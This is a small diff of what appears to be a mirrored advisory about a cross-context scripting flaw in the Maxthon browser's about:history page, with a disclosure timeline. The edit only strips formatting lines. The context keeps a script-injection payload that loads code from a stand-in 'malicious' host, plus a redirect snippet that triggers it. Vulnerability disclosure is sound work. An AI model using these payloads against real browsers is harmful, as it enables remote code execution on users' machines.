@@ -103,11 +103,9 @@ page going offline. To read the original, follow the link above.
  The exploitation is divided into three phases:
 
  **[1] Create an entry in the history page which contains the injection - injection via location.hash**
- *
 * *http://x.x.x.x/maliciouspage.html**#<script src=http://malicious/malicious.js></script>***
 
  **[2] Redirect browser to the about:history page to trigger execution in the Maxthon trusted zone maliciouspage.html would contain something as:**
- *
 * *<body><script>window.location='**about:history**';</script></body>*
 
  Note this redirection should not occur since it is invoked from a page on the Internet (http://) - due to the protocol mismatch, same-origin policy should trigger.
@@ -132,10 +130,8 @@ page going offline. To read the original, follow the link above.
 
  Maxthon - Cross Context Scripting (XCS) - about:history - Java overwrite technique - Metasploit in action:
 
- **
 ** Maxthon - Cross Context Scripting (XCS) - about:history - maxthon.program technique - Metasploit in action:
 
- **
 ** **Timeline**
 
  13/02/2012 - Bug reported to multiple contacts
